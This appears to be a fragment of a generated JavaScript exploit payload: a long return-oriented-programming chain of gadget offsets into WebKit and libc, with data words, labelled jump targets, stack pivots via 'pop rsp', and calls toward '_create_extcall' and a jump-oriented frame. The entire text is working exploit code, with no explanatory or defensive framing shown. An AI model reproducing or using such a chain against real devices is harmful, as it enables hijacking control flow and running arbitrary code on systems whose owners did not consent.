webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+154104, //L2225
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+154088, //L2224
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2223:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2224:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2225:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+154192, //L2226
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2226:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+154248, //L2228
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2228:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+154336, //L2231
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2230:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+772328,); //pop rcx
//L2231:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
webkit_base+2989859, //mov [rax], rcx
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2233:
db([40, 0]); // 0x28
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+154480, //L2236
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+154464, //L2235
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2235:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2236:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+154624, //L2240
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+154592, //L2238
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+154608, //L2239
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2238:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2239:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2240:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+154720, //L2242
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2241:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+772328,); //pop rcx
//L2242:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+154824, //L2245
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+154808, //L2244
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2244:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2245:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+154968, //L2249
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+154936, //L2247
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+154952, //L2248
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2247:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2248:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2249:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+155040, //L2250
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2250:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+155096, //L2252
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2252:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+155192, //L2255
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2254:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+772328,); //pop rcx
//L2255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+155296, //L2258
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+155280, //L2257
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2257:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2258:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149873, //mov eax, [rdi]
libc_base+713278, //pop rsi
ropchain+155456, //L2261
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+155488, //L2263
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+155440, //L2260
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+155472, //L2262
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2260:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2261:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2262:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2263:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+155600, //L2264
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+155632, //L2266
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1816389, //mov rax, r11
libc_base+713278, //pop rsi
ropchain+155616, //L2265
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2264:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2265:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2266:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+155720, //L2267
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2267:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+155776, //L2269
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2269:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+155872, //L2271
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2271:
db([0, 0]); // 0x0
set_gadgets([
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+155928, //L2273
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2273:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+772328 //pop rcx
]);
//L2275:
db([16, 0]); // 0x10
set_gadget(libc_base+768796,); //pop rax
//L2276:
db([16, 0]); // 0x10
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+844101, //sub rax, rcx ; sbb rdx, rcx
libc_base+713278, //pop rsi
ropchain+156080, //L2277
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+156136, //L2279
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2279:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+156256, //L2282
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2281:
db([32, 0]); // 0x20
set_gadget(libc_base+772328,); //pop rcx
//L2282:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+156360, //L2285
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+156344, //L2284
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2284:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2285:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+156504, //L2289
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+156472, //L2287
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+156488, //L2288
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2287:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2288:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2289:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+156600, //L2291
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2290:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+772328,); //pop rcx
//L2291:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+156704, //L2294
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+156688, //L2293
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2293:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2294:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+156848, //L2298
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+156816, //L2296
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+156832, //L2297
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2296:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2297:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2298:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2300:
ropchain+156952, //L2299
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+86896, //_create_extcall
//L2299:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+157040, //L2302
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2301:
db([4294967272, 4294967295]); // -0x18
set_gadget(libc_base+772328,); //pop rcx
//L2302:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+157144, //L2305
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+157128, //L2304
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2304:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2305:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+157288, //L2309
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+157256, //L2307
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+157272, //L2308
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2307:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2308:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2309:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2310:
jop_frame_addr,
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+157432, //L2312
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2311:
db([24, 0]); // 0x18
set_gadget(libc_base+772328,); //pop rcx
//L2312:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+157536, //L2315
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+157520, //L2314
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2314:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2315:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+157680, //L2319
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+157648, //L2317
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+157664, //L2318
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2317:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2318:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2319:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278, //pop rsi
ropchain+157776, //L2321
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278 //pop rsi
]);
//L2320:
db([16, 0]); // 0x10
set_gadget(libc_base+772328,); //pop rcx
//L2321:
db([0, 0]); // 0x0
set_gadgets([
libc_base+507828, //add rax, rsi
libc_base+713278, //pop rsi
ropchain+157880, //L2324
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+157864, //L2323
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+772328 //pop rcx
]);
//L2323:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2324:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278, //pop rsi
ropchain+158024, //L2328
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+157992, //L2326
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+863109, //mov rax, rcx
libc_base+713278, //pop rsi
ropchain+158008, //L2327
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2326:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2327:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2328:
db([0, 0]); // 0x0
set_gadget(libc_base+713278,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+768796, //pop rax
//L2330:
ropchain+158128, //L2329
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+489696, //pop rsp
ropchain+159008, //L2331
//L2329:
libc_base+863109, //mov rax, rcx
libc_base+713278 //pop rsi
]);
db([4294967264, 4294967295]); // -0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+158256, //L2332
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+158288, //L2334
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+158272, //L2333
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2332:
db([0, 0]); // 0x0
set_gadget(webkit_base+3789839,); //pop r11
//L2333:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2334:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6264134, //movsxd rax, edi
libc_base+713278, //pop rsi
ropchain+158400, //L2335
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+158432, //L2337
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+158416, //L2336
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+772328 //pop rcx
]);
//L2335:
db([0, 0]); // 0x0
set_gadget(libc_base+165442,); //pop rdi
//L2336:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2337:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+158536, //L2338
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+158552, //L2339
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2338:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2339:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+158672, //L2340
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+158656, //L2341
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2341:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2340:
db([0, 0]); // 0x0
set_gadgets([
libc_base+713278, //pop rsi
ropchain+158760, //L2343
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+740138, //mov rax, r8
libc_base+713278, //pop rsi
ropchain+158744, //L2342
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+165442 //pop rdi
]);
//L2342:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2343:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+158864, //L2344
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+158880, //L2345
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+1420514 //pop r8
]);
//L2344:
db([0, 0]); // 0x0
set_gadget(libc_base+768796,); //pop rax
//L2345:
db([0, 0]); // 0x0
set_gadgets([
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+713278, //pop rsi
ropchain+159000, //L2346
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
webkit_base+13378624, //mov rax, [rsi]
libc_base+713278, //pop rsi
ropchain+158984, //L2347
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+768796 //pop rax
]);
//L2347:
db([0, 0]); // 0x0
set_gadget(libc_base+489696,); //pop rsp
//L2346:
db([0, 0]); // 0x0
//L2331:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
